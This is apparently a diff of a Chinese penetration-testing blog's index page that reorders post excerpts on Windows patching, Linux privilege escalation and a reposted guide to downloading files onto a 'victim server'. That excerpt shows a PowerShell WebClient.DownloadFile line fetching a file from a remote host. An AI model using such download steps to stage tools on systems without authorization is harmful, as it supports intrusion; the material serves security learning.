@@ -440,6 +440,59 @@
             
             October 04, 2019
         </p>
+        <h3 class="post-title animated fadeInDown"><a href="knlvre.github.io/2019/10/04/Windows系统添加补丁/" title="Windows系统添加补丁" class="posttitle">Windows系统添加补丁</a></h3>
+        
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>Words count</i>
+                        9.6k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                        9 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="knlvre.github.io/tags/渗透测试/">渗透测试</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <p># </p>
+<p>各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到<code>Microsoft</code>的官网去查看和下载：<a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
+<p>点击左边栏的<code>Security Bulletins</code>可以查找想要看的漏洞</p>
+<p></p>
+<p>这里以打<code>MS16-032（CVE-2016-0099）</code>的补丁为例：左边栏找到<code>MS16-032</code>，找到系统对应版本</p>
+<p></p>
+<p>在跳转页面后，点击<code>Download</code>，下载</p>
+<p></p>
+<p></p>
+<p>Windows系统自带补丁安装程序：<code>wusa</code>。命令...</p>
+            
+            <span class="read-more"><a href="knlvre.github.io/2019/10/04/Windows系统添加补丁/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+        </div>
+    </div>
+</div>
+
+
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+            
+            October 04, 2019
+        </p>
         <h3 class="post-title animated fadeInDown"><a href="knlvre.github.io/2019/10/04/Linux 提权常用命令集/" title="Linux 提权常用命令集" class="posttitle">Linux 提权常用命令集</a></h3>
         
             <p class="post-count animated fadeInDown">
@@ -488,19 +541,19 @@
             
             October 04, 2019
         </p>
-        <h3 class="post-title animated fadeInDown"><a href="knlvre.github.io/2019/10/04/Windows系统添加补丁/" title="Windows系统添加补丁" class="posttitle">Windows系统添加补丁</a></h3>
+        <h3 class="post-title animated fadeInDown"><a href="knlvre.github.io/2019/10/04/十三种方式下载文件/" title="十三种方式下载文件" class="posttitle">十三种方式下载文件</a></h3>
         
             <p class="post-count animated fadeInDown">
                 
                     <span>
                         <b class="iconfont icon-text2"></b> <i>Words count</i>
-                        9.6k
+                        14k
                     </span>
                 
                 
                     <span>
                         <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                        9 mins.
+                        12 mins.
                     </span>
                 
                 
@@ -511,18 +564,12 @@
         
         <div class="md-content animated fadeIn">
             
-                <p># </p>
-<p>各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到<code>Microsoft</code>的官网去查看和下载：<a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
-<p>点击左边栏的<code>Security Bulletins</code>可以查找想要看的漏洞</p>
-<p></p>
-<p>这里以打<code>MS16-032（CVE-2016-0099）</code>的补丁为例：左边栏找到<code>MS16-032</code>，找到系统对应版本</p>
-<p></p>
-<p>在跳转页面后，点击<code>Download</code>，下载</p>
-<p></p>
-<p></p>
-<p>Windows系统自带补丁安装程序：<code>wusa</code>。命令...</p>
+                <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
+<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
+<p>创建如下PSH脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt...</span></span></pre></td></tr></table></figure>
             
-            <span class="read-more"><a href="knlvre.github.io/2019/10/04/Windows系统添加补丁/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+            <span class="read-more"><a href="knlvre.github.io/2019/10/04/十三种方式下载文件/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
     </div>
 </div>
@@ -577,53 +624,6 @@
 <p>Windows Vista、Windows...</p></blockquote>
             
             <span class="read-more"><a href="knlvre.github.io/2019/10/04/MS16-032（CVE-2016-0099）复现/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
-        </div>
-    </div>
-</div>
-
-
-<div class="post" id="post">
-    <div class="post-cover animated fadeIn" style="
-            background-image:
-            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-            url(/img/welcome-cover.jpg);">
-    </div>
-    <div class="else">
-        <p class="animated fadeInDown">
-            
-                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
-            
-            October 04, 2019
-        </p>
-        <h3 class="post-title animated fadeInDown"><a href="knlvre.github.io/2019/10/04/十三种方式下载文件/" title="十三种方式下载文件" class="posttitle">十三种方式下载文件</a></h3>
-        
-            <p class="post-count animated fadeInDown">
-                
-                    <span>
-                        <b class="iconfont icon-text2"></b> <i>Words count</i>
-                        14k
-                    </span>
-                
-                
-                    <span>
-                        <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                        12 mins.
-                    </span>
-                
-                
-            </p>
-            
-                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="knlvre.github.io/tags/渗透测试/">渗透测试</a></li></ul>
-            
-        
-        <div class="md-content animated fadeIn">
-            
-                <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
-<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
-<p>创建如下PSH脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt...</span></span></pre></td></tr></table></figure>
-            
-            <span class="read-more"><a href="knlvre.github.io/2019/10/04/十三种方式下载文件/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
     </div>
 </div>
